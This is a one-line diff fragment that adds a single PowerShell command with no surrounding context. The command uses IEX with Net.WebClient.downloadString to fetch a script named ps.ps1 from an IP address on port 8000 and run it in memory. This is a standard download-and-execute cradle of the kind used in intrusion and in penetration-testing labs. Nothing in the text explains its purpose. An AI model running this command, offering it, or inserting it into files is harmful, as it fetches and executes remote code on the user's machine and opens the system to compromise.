@@ -1,0 +1,1 @@
+PowerShell “IEX(New-Object Net.WebClient).downloadString(‘http://10.8.235.86:8000/ps.ps1')"
